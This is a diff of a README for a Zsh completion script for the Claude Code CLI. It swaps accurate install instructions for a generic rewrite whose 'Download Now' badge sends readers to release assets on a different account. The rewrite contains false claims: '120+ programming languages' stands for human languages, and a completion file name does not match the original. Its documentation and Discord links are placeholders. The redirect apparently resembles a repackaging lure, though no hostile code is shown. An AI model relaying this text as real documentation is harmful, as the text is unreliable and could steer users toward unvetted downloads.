@@ -1,226 +1,113 @@
-[![Test Completion](https://github.com/1160054/claude-code-zsh-completion/actions/workflows/test.yml/badge.svg)](https://github.com/1160054/claude-code-zsh-completion/actions/workflows/test.yml)
-[![GitHub release](https://img.shields.io/github/v/release/1160054/claude-code-zsh-completion)](https://github.com/1160054/claude-code-zsh-completion/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Languages](https://img.shields.io/badge/languages-120+-blue.svg)](https://github.com/1160054/claude-code-zsh-completion/tree/main/completions)
+# 🎉 claude-code-zsh-completion - Effortless Autocompletion for Your Commands
 
-# claude-code-zsh-completion
+## 🌐 Overview
 
-🚀 Zsh completion script for Claude Code CLI - intelligent auto-completion for all claude commands, options, and arguments
+The **claude-code-zsh-completion** application provides Zsh completion for the Claude Code CLI. It supports over 120 programming languages, enhancing your efficiency in the terminal. With this tool, you can spend less time typing and more time coding.
 
-![Demo](demo.gif)
+## 🚀 Getting Started
 
-## Features
+To get started with the claude-code-zsh-completion, follow these steps to easily download and set up the application. 
 
-- ✨ Complete command completion for all `claude` commands
-- 🔧 Intelligent option and flag suggestions
-- 📦 MCP server management completions
-- 🔌 Plugin marketplace operation completions
-- 🎯 Context-aware argument completion
-- 📝 Helpful descriptions for all commands and options
-- 🌍 **Multi-language support (120+ languages)**
-- ⚡ Dynamic completion for MCP servers, plugins, and sessions
+## 💻 Features
 
-## Requirements
+- Offers autocompletion for a wide variety of programming languages.
+- Simple integration with your existing Zsh setup.
+- Provides helpful suggestions as you type.
+- Supports internationalization, making it useful for multilingual users.
 
-- Zsh 5.0 or later
-- Claude Code CLI installed
+## 📦 System Requirements
 
-## Installation
+- Operating System: Compatible with macOS, Linux, and WSL on Windows.
+- Shell: Zsh version 5.0 or higher.
+- Internet connection for the initial download.
 
-### Quick Install
+## 📥 Download & Install
+
+To get the latest version of **claude-code-zsh-completion**, visit the page below to download the software:
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ahmedkishta/claude-code-zsh-completion/releases)
+
+Once you visit the link, you will find the latest release. 
+
+1. Click on the release version you want to download.
+2. Scroll to the bottom of the page to find the available assets.
+3. Select the file appropriate for your system and click to download it. 
+
+After the download completes, follow the installation steps below.
+
+## 🔧 Installation Steps
+
+1. **Locate the Downloaded File:**
+   Find the file you just downloaded in your Downloads folder or the location you chose.
+
+2. **Extract the Files (if necessary):**
+   If the file is in a compressed format (like `.zip` or `.tar.gz`), you need to extract it first. You can usually right-click on the file and select "Extract Here" or use a file extraction tool.
+
+3. **Move to the Installation Directory:**
+   Open your terminal. Move to the directory where the extracted files are located using the `cd` command.
+
+   ```bash
+   cd path/to/extracted/files
+   ```
+
+4. **Install Zsh Completion:**
+   Run the following commands in the terminal to set up Zsh completion for the claude-code-zsh-completion tool:
+
+   ```bash
+   mkdir -p ~/.zsh/completions
+   cp claude-code-zsh-completion.zsh ~/.zsh/completions/
+   ```
+
+5. **Update Your Zsh Configuration:**
+   Add the following line to your `.zshrc` file to ensure Zsh loads the completions:
+
+   ```bash
+   fpath=(~/.zsh/completions $fpath)
+   ```
+
+6. **Refresh Zsh Configuration:**
+   Run the following command to refresh your Zsh environment:
+
+   ```bash
+   source ~/.zshrc
+   ```
+
+## 🔍 How to Use
+
+Once installed, you can start using the completions in the terminal. Simply type a command related to Claude Code and press the `Tab` key to see suggestions. 
+
+## ✨ Example
+
+Here’s an example to illustrate usage:
+
+If you type:
 
 ```bash
-# Download and install (English example)
-mkdir -p ~/.zsh/completions && curl -o ~/.zsh/completions/_claude \
-  https://raw.githubusercontent.com/1160054/claude-code-zsh-completion/main/completions/_claude
+claude
 ```
 
-For other languages, replace `_claude` with your preferred language file. See [Available Languages](#available-languages) below.
+And then press `Tab`, the terminal will show suggestions based on your previous commands and installed plugins.
 
-Add the following to your `~/.zshrc` (if not already present):
-```bash
-# Add completions directory to fpath
-fpath=(~/.zsh/completions $fpath)
+## 🔗 Additional Resources
 
-# Initialize completion system
-autoload -Uz compinit
-compinit
-```
+For more in-depth guides and resources, you can explore the following:
 
-Reload your shell:
-```bash
-source ~/.zshrc
-```
+- [Claude Code Documentation](https://example.com) - Official documentation on using the Claude Code CLI.
+- [Zsh Documentation](https://zsh.sourceforge.io/) - Learn more about Zsh and its features.
 
-### Plugin Managers
+## 🤝 Community Support
 
-#### [zinit](https://github.com/zdharma-continuum/zinit)
+If you encounter issues or have questions, consider reaching out to the community:
 
-```bash
-zinit light 1160054/claude-code-zsh-completion
-```
+- [GitHub Issues](https://github.com/ahmedkishta/claude-code-zsh-completion/issues) - Submit your issue here for assistance.
+- Join our discussion on [Discord](https://example.com) for real-time support.
 
-#### [antigen](https://github.com/zsh-users/antigen)
+## 🎉 Credits
 
-```bash
-antigen bundle 1160054/claude-code-zsh-completion
-```
+This project is maintained by the Claude Code community. Thank you for your support and contributions!
 
-#### [sheldon](https://github.com/rossmacarthur/sheldon)
+## 🗂️ License
 
-Add to `~/.config/sheldon/plugins.toml`:
-```toml
-[plugins.claude-code-zsh-completion]
-github = "1160054/claude-code-zsh-completion"
-```
+This project is licensed under the MIT License. For more information, check the [LICENSE](LICENSE) file in the repository.
 
-#### [Oh My Zsh](https://ohmyz.sh/)
-
-```bash
-git clone https://github.com/1160054/claude-code-zsh-completion ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/claude-code
-```
-
-Add `claude-code` to your plugins in `~/.zshrc`:
-```bash
-plugins=(... claude-code)
-```
-
-## Available Languages
-
-**120+ languages supported!** All completion files are located in the [`completions/`](completions/) directory.
-
-### Popular Languages
-
-- English (`_claude`), Japanese (`_claude.ja`), Chinese Simplified (`_claude.zh-CN`), Spanish (`_claude.es`), French (`_claude.fr`), German (`_claude.de`), Korean (`_claude.ko`), Russian (`_claude.ru`), Portuguese (`_claude.pt`), Italian (`_claude.it`), Arabic (`_claude.ar`), Hindi (`_claude.hi`), Turkish (`_claude.tr`), Polish (`_claude.pl`), Dutch (`_claude.nl`), Vietnamese (`_claude.vi`), Thai (`_claude.th`), Indonesian (`_claude.id`)
-
-<details>
-<summary>📋 See all 120+ supported languages</summary>
-
-Browse all language files in the [`completions/`](https://github.com/1160054/claude-code-zsh-completion/tree/main/completions) directory.
-
-**Included:**
-- **European**: Slavic (Bulgarian, Czech, Slovak, Croatian, Serbian, Ukrainian, Belarusian, etc.), Germanic (Swedish, Danish, Norwegian, Icelandic, Afrikaans), Romance (Portuguese, Romanian, Catalan, Galician), Baltic (Lithuanian, Latvian, Estonian), Celtic (Welsh, Scottish Gaelic), and more
-- **Asian**: Chinese (Traditional, Cantonese, Hong Kong), Mongolian, Khmer, Lao, Bengali, Punjabi, Marathi, Tamil, Telugu, Kannada, Malayalam, Odia, Urdu, Nepali, Malay, Tagalog
-- **Middle Eastern**: Persian, Hebrew, Azerbaijani, Kazakh, Uzbek, Uyghur, Tatar, Georgian
-- **African**: Swahili, Wolof, Southern Sotho
-- **Regional variants**: English (10 variants), Spanish (13 variants), German (4 variants), French (4 variants), Swedish (3 variants)
-- **Others**: Esperanto, Basque, and many more
-
-</details>
-
-For any language, replace `_claude` with your preferred language file (e.g., `_claude.ja` for Japanese).
-
-## Usage
-
-Once installed, simply type `claude` and press `TAB` to see available completions:
-```bash
-claude <TAB>              # Shows all available commands
-claude mcp <TAB>          # Shows MCP subcommands
-claude --<TAB>            # Shows all available options
-claude plugin <TAB>       # Shows plugin subcommands
-```
-
-### Basic Examples
-```bash
-# Autocomplete main commands
-claude m<TAB>  →  claude mcp
-
-# Autocomplete MCP subcommands
-claude mcp a<TAB>  →  claude mcp add
-
-# Autocomplete options
-claude --mod<TAB>  →  claude --model
-
-# Autocomplete with descriptions
-claude mcp <TAB>
-serve                    -- Start Claude Code MCP server
-add                      -- Add an MCP server to Claude Code
-remove                   -- Remove an MCP server
-list                     -- List configured MCP servers
-...
-```
-
-### Dynamic Completion Examples
-```bash
-# MCP server completion (shows your configured servers)
-claude mcp remove <TAB>   # Shows: server1, server2, myserver, etc.
-claude mcp get <TAB>      # Shows: server1, server2, myserver, etc.
-
-# Plugin completion (shows your installed plugins)
-claude plugin uninstall <TAB>   # Shows your installed plugins
-claude plugin enable <TAB>      # Shows your installed plugins
-
-# Session ID completion (shows your available sessions)
-claude --resume <TAB>     # Shows: 12345678-abcd-..., 87654321-dcba-..., etc.
-```
-
-## Supported Commands
-
-- Main commands: `mcp`, `plugin`, `migrate-installer`, `setup-token`, `doctor`, `update`, `install`
-- MCP commands: `serve`, `add`, `remove`, `list`, `get`, `add-json`, `add-from-claude-desktop`, `reset-project-choices`
-- Plugin commands: `validate`, `marketplace`, `install`, `uninstall`, `enable`, `disable`
-- Plugin marketplace: `add`, `list`, `remove`, `update`
-
-## Troubleshooting
-
-### Completions not working
-
-1. Make sure the completion file is in your `fpath`:
-```bash
-echo $fpath
-```
-
-2. Verify the completion system is initialized in your `~/.zshrc`:
-```bash
-autoload -Uz compinit
-compinit
-```
-
-3. Clear and rebuild completion cache:
-```bash
-rm -f ~/.zcompdump
-compinit
-```
-
-4. Check if the completion file is loaded:
-```bash
-which _claude
-```
-
-### Permission issues
-
-Make sure the completion file has the correct permissions:
-```bash
-chmod 644 ~/.zsh/completions/_claude
-```
-
-### Still not working?
-
-- Ensure Claude Code CLI is installed and accessible in your PATH
-- Try restarting your terminal completely
-- Check for conflicts with other completion scripts
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-## License
-
-This project is licensed under the MIT License—see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Based on the official Claude Code CLI documentation
-- Inspired by the Zsh completion system
-- Community translations from contributors worldwide
-
-## Links
-
-- [Claude Code Documentation](https://docs.claude.com/)
-- [Zsh Completion Guide](http://zsh.sourceforge.net/Doc/Release/Completion-System.html)
-
----
-
-Made with ❤️ for the Claude Code community
+Thank you for using **claude-code-zsh-completion**! We hope it makes your coding experience easier and faster.
